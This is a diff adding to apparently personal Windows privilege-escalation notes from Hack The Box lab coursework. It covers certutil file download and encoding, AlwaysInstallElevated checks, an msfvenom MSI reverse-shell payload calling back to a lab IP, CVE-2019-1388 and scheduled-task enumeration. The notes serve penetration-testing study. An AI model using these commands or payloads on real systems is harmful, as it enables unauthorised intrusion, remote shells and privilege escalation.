@@ -24,3 +24,59 @@ $lnk.Description = "Browsing to the directory where this file is saved will trig
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
+
+Transferring file with certutil:
+
+We can transfer, encode and decode file with certutil:
+```
+PS C:\htb> certutil.exe -urlcache -split -f <url> <filename>
+```
+
+```
+C:\htb> certutil -encode file1 encodedfile
+
+Input Length = 7
+Output Length = 70
+CertUtil: -encode command completed successfully
+```
+
+```
+C:\htb> certutil -decode encodedfile file2
+
+Input Length = 70
+Output Length = 7
+CertUtil: -decode command completed successfully.
+```
+
+Privilege Escalation with Always Install Elevated:
+
+If Always Install Elevated is enabled, it means that every time when user install application, it will be run in elevated context, after we verify it is on, we can craft malicious payload with msfvenom in .msi format:
+
+```
+PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+
+HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+```
+PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+We then generate payload with msfvenom:
+```
+Avalon112@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+```
+
+By utlizing CVE-2019-1388 we can open a cmd in the context of NT Authority /System due to vulnerability in Windows Certificate Dialog, if we suspect target is affected we can refer https://academy.hackthebox.com/app/module/67/section/635
+
+Privilege Escalation with Scheduled Task:
+
+Like abusing cronjobs, sometimes we maybe able to find scheduled task sitting in a directory that give us permission to modify it, we enumerate schedule task first:
+
+```
+C:\htb>  schtasks /query /fo LIST /v
+```
